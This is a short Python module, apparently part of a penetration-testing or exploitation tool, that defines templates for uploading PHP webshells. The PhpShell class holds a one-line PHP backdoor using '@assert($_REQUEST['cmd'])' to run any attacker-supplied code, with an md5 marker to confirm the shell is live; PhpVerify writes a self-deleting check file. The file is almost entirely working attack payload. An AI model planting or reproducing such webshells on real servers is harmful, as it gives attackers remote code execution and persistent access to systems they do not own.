#author: fyth


from webshell import *


class PhpShell(Webshell):
    _password = 'cmd'
    _content = "<?php var_dump(md5(123));@assert($_REQUEST['{0}']);?>"
    _check_statement = 'var_dump(md5(123));'
    _keyword = '202cb962ac59075b964b07152d234b70'


class PhpVerify(VerifyShell):
    _content = "<?php var_dump(md5(123));unlink(__FILE__);?>"
    _keyword = '202cb962ac59075b964b07152d234b70'

